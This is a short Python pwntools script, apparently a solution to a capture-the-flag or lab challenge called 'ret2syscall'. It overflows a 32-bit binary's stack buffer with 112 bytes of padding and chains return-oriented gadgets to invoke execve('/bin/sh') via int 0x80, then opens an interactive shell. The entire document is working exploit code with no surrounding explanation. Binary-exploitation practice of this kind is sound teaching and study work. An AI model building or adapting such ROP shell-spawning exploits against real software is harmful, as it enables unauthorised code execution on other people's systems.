from pwn import *
context.arch="i386"
io=process('./ret2syscall')
bin_sh_addr =0x080BE408
pop_edx_ecx_ebx_addr =0x0806eb90
pop_eax_addr =0x080bb196
int_80_addr =0x08049421
payload=flat([b'a'*112,pop_eax_addr,0xb,pop_edx_ecx_ebx_addr,0,0,bin_sh_addr,int_80_addr])
io.sendline(payload)
io.interactive()

